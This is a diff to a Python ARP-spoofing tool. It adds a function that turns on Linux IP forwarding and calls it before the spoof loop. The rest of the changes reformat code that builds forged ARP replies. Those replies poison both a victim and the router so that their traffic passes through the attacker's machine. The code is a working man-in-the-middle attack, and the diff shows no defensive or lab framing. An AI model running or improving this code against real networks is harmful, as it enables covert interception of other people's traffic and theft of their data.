@@ -5,6 +5,19 @@ from time import sleep
 import subprocess
 import fcntl
 
+
+def enable_ip_forwarding():
+    """
+    Enables IP forwarding on Linux.
+    """
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1")
+        print("[*] IP forwarding enabled.")
+    except Exception as e:
+        print(f"[!] Failed to enable IP forwarding: {e}")
+
+
 def get_local_mac(interface="eth0"):
     """
     Retrieves the local MAC address of a given interface using socket and fcntl.
@@ -21,6 +34,7 @@ def get_local_mac(interface="eth0"):
         print(f"[!] Failed to get MAC address for interface {interface}: {e}")
         return None
 
+
 def get_mac(ip):
     """
     Retrieves the MAC address corresponding to the given IP address using the `arp` command.
@@ -33,6 +47,7 @@ def get_mac(ip):
     except Exception as e:
         print(f"Failed to get MAC address for {ip}: {e}")
     return None
+
 
 def create_arp_packet(src_mac, src_ip, target_mac, target_ip, operation=2):
     """
@@ -67,12 +82,15 @@ def create_arp_packet(src_mac, src_ip, target_mac, target_ip, operation=2):
 
     return ethernet_frame + arp_header
 
+
 def perform_arp_spoof(victim_ip, iface="eth0"):
     """
     Performs ARP spoofing against the specified victim IP.
     """
+    enable_ip_forwarding()
     # Get local MAC address
-    raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
+    raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW,
+                        socket.ntohs(0x0806))
     raw.bind((iface, socket.htons(0x0806)))
 
     local_mac = get_local_mac()
@@ -87,7 +105,8 @@ def perform_arp_spoof(victim_ip, iface="eth0"):
         return
 
     # Get router IP and MAC address
-    router_ip = subprocess.check_output(["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]
+    router_ip = subprocess.check_output(
+        ["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]
     router_mac = get_mac(router_ip)
     if not router_mac:
         print(f"[!] Failed to retrieve router MAC address for {router_ip}.")
@@ -98,8 +117,10 @@ def perform_arp_spoof(victim_ip, iface="eth0"):
     print(f"[*] Router MAC: {router_mac} ({router_ip})")
 
     # Create ARP spoof packets
-    victim_packet = create_arp_packet(local_mac, router_ip, victim_mac, victim_ip)
-    router_packet = create_arp_packet(local_mac, victim_ip, router_mac, router_ip)
+    victim_packet = create_arp_packet(
+        local_mac, router_ip, victim_mac, victim_ip)
+    router_packet = create_arp_packet(
+        local_mac, victim_ip, router_mac, router_ip)
 
     print("[*] Starting ARP spoofing...")
     try:
@@ -110,4 +131,3 @@ def perform_arp_spoof(victim_ip, iface="eth0"):
     except KeyboardInterrupt:
         print("\n[!] Stopping ARP spoofing.")
         raw.close()
-
